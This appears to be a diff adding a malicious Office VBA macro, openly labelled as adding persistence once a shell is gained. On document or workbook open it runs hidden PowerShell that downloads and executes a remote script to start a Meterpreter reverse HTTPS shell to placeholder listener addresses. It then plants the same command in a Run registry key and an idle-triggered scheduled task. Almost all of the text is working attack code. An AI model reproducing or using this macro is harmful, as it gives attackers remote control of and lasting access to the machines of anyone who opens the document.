@@ -1,0 +1,19 @@
+#Macro that will also add persistence once shelled.
+Sub shellexec()
+
+    Dim wsh As Object
+    Set wsh = VBA.CreateObject("WScript.Shell")
+    Dim waitOnReturn As Boolean: waitOnReturn = False
+    Dim windowStyle As Integer: windowStyle = 0
+    Dim errorCode As Integer
+
+    wsh.Run "powershell.exe -Command iex(New-Object Net.WebClient).DownloadString('http://URLHERE');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost LISTENERIPHERE-Lport LISTENERPORTHERE -Force", windowStyle, waitOnReturn
+    wsh.Run "REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\ /f /t REG_SZ /v ENTRYNAMEHERE /d ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -Command iex(New-Object Net.WebClient).DownloadString('http://URLHERE');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost LISTENERIPHERE -Lport LISTENERPORTHERE -Force""", windowStyle, waitOnReturn
+   wsh.Run "schtasks /create /tn TASKNAMEHERE /tr ""powershell.exe -WindowStyle hidden -c 'IEX((new-object net.webclient).downloadstring(''http://URLHERE'''))';Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost LISTENERIPHERE -Lport LISTENERPORTHERE -Force"" /sc onidle /i 1", windowStyle, waitOnReturn
+End Sub
+Sub AutoOpen()
+    shellexec
+End Sub
+Sub Workbook_Open()
+    shellexec
+End Sub
